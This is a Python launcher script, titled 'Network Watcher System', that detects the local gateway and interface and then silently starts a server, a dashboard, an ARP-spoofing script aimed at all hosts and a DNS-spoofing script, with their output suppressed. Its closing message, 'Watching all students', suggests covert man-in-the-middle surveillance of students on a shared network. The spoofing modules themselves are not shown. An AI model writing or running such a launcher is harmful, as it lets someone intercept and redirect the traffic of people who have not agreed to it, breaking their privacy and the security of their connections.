import subprocess
import threading
import time

from autodetect_network import get_gateway_ip, get_local_ip, get_network_interface

def start_server():
    subprocess.Popen(["python", "server.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_dashboard():
    subprocess.Popen(["python", "dashboard_server.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_arp_spoof():
    subprocess.Popen(["python", "arp_spoof_all.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_dns_spoof():
    subprocess.Popen(["python", "dns_spoof.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    print("=== Network Watcher System ===")
    print(f"[+] Detected Gateway IP: {get_gateway_ip()}")
    print(f"[+] Your Machine IP: {get_local_ip()}")
    print(f"[+] Active Interface: {get_network_interface()}")
    print("[*] Launching full control system...")

    threading.Thread(target=start_server).start()
    time.sleep(1)

    threading.Thread(target=start_dashboard).start()
    time.sleep(1)

    threading.Thread(target=start_arp_spoof).start()
    time.sleep(1)

    threading.Thread(target=start_dns_spoof).start()
    time.sleep(1)

    print("[+] System is running in background. Watching all students 👀")
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
